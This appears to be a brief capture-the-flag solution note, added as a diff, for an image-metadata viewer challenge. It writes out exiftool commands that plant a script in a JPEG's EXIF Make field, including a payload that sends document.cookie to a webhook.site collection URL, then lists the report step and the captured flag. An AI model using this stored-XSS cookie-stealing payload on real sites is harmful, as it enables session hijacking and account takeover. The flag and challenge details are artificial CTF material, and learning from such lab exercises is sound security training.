@@ -1,0 +1,15 @@
+https://imgr.pwn.institute/imageinfo/<id>
+	show metadata
+
+# Test
+exiftool -Make="<script>alert(1)</script>" test.jpg
+
+# Malicious Payload
+exiftool -Make="<script>new Image().src='https://webhook.site/1259045f-076d-49d7-9435-e1d8058799fd/?c='+document.cookie;</script>" test.jpg
+
+# Report
+https://imgr.pwn.institute/report
+	https://imgr.pwn.institute/imageinfo/cb433e7d3eff43d4bb2701243d82097e
+
+# Get flag
+BCTF{n3v3r_pUbl15h_Unf1n15h3d_p4ge5}
